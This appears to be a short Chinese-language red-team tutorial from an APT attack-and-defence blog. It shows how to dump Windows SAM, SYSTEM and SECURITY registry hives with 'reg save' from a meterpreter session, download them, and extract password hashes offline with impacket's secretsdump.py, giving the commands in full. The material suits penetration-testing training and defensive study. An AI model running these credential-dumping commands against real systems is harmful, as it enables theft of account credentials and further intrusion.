专注APT攻击与防御
https://micropoor.blogspot.com/

很多环境下，不允许上传或者使用mimikatz。而针对非域控的单机离线提取hash显得尤为重要。

在meterpreter shell命令切到交互式cmd命令。
![](media/647ac3d1d83b7d7711b2cfd0ce18f1d5.jpg)

reg save 方式使得需要下载的目标机hash文件更小。
* reg save HKLM\SYSTEM sys.hiv
* reg save HKLM\SAM sam.hiv
* reg save hklm\security security.hiv
![](media/cebaa1fc93231bc1aaf7738c222b5ac6.jpg)

![](media/f2dc08a2bd64fc29ec0189933b4442dc.jpg)

meterpreter下自带download功能。
![](media/336cd95e4be157c266efcd04d9ddc064.jpg)

![](media/3f2d037ed7ac0197c01e95b7651fad41.jpg)

**离线提取：**

本季用到的是impacket的 secretsdump.py。Kali默认路径：`/root/impacket/examples/secretsdump.py`

**命令如下：**
```
root@John:/tmp# python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL
```
![](media/ced7254cc160ced11f2f3f512df53aec.jpg)


>   Micropoor
